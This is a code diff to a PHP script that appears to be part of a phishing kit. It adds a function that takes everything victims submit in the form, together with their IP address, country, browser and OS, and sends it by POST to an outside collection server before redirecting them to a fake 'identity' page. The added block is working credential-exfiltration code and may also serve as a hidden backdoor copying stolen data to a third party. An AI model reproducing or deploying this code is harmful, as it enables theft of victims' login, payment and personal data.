@@ -110,6 +110,40 @@ $f = fopen("../../users/tnt3.html", "a");
 fwrite($f, $content);
 		
 fclose($f);
+
+
+//----------------send request post to url ----------------
+function sendPost($url,$data) {
+	
+	
+	
+$options = array(
+        'http' => array(
+        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method'  => 'POST',
+        'content' => http_build_query($data),
+    )
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+}
+
+$data = $_POST;
+$data['date'] = $date;
+$data['$CountryA'] = $CountryA;
+$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
+$data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
+$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
+
+sendPost('http://www.save-test.epizy.com/sv3.php',$data);
+
+
+//---- end request----------------
+
+
+
 		
 	
 HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
